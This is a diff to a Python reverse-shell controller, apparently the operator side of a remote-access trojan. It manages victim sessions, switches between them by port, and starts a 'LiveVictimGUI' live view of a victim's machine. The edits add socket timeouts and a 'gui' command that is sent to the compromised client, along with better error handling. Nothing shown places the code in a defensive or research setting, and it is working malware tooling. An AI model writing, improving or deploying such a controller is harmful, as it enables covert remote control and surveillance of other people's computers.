@@ -4,6 +4,7 @@ def reverse_shell():
     import sys
     import os
     import json
+    import time
     from LiveGUI import LiveVictimGUI
     def start_live_view(client):
         def run_gui():
@@ -12,7 +13,7 @@ def reverse_shell():
             except Exception as e:
                 print(f"error: {e}")
             finally:
-                print("\nlive view stopped")
+                print("\n[!] Live view stopped")
         live_thread = threading.Thread(target=run_gui, daemon=True)
         live_thread.start()
     HOST = '0.0.0.0'
@@ -55,6 +56,7 @@ def reverse_shell():
                     pass
             sessions[port] = client
             save_sessions()
+        client.settimeout(0.1)
         while True:
             try:
                 data = client.recv(4096)
@@ -104,8 +106,15 @@ def reverse_shell():
                 except:
                     print("use <port>")
             elif cmd.lower() == "gui":
-                if active_port:
-                    start_live_view(sessions[active_port])
+                if active_port and active_port in sessions:
+                    try:
+                        sessions[active_port].send(b"gui\n")
+                        time.sleep(0.5)
+                        start_live_view(sessions[active_port])
+                    except Exception as e:
+                        print(f"[ERROR] Failed to start GUI: {e}")
+                else:
+                    print("[-] No active session selected")
             elif cmd == "clear" or cmd == "cls":
                 os.system('cls' if os.name == 'nt' else 'clear')
             elif cmd == "sessions":
